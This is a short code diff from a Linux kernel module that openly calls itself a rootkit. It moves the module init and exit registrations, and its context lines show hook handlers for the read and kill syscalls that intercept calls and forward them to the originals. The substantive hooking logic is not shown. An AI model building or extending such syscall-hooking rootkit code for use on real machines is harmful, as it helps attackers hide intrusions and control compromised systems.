@@ -50,6 +50,9 @@ static __exit void rootkit_exit(void)
     return;
 }
 
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+
 // sys_read syscall hook handler
 SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __user *, s_buf, size_t,
                       sz_count)
@@ -367,6 +370,3 @@ SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
     // Signal was not intercepted, forward it to the original syscall
     return orig_kill(p_regs);
 }
-
-module_init(rootkit_init);
-module_exit(rootkit_exit);
